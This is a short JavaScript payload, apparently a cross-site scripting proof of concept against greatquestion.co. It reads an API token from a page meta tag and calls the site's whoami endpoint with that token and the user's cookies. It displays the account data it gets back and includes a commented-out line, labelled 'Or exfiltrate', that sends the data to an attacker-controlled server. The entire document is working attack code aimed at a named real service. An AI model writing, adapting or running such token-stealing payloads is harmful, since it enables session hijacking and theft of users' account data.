(function () {
  try {
    const tokenMeta = document.querySelector('meta[name="gq-api-token"]');
    if (!tokenMeta) return alert('Token meta tag not found');

    const token = tokenMeta.getAttribute('content');

    fetch('https://greatquestion.co/api/v1/whoami', {
      method: 'GET',
      headers: {
        'Authorization': token,
        'Accept': '*/*'
      },
      credentials: 'include'
    })
    .then(res => res.json())
    .then(data => {
      // Send to your server or log to console
      alert(JSON.stringify(data));
      // Or exfiltrate:
      // fetch('https://your-server.com/log?data=' + encodeURIComponent(JSON.stringify(data)));
    });
  } catch (e) {
    alert('Error: ' + e);
  }
})();
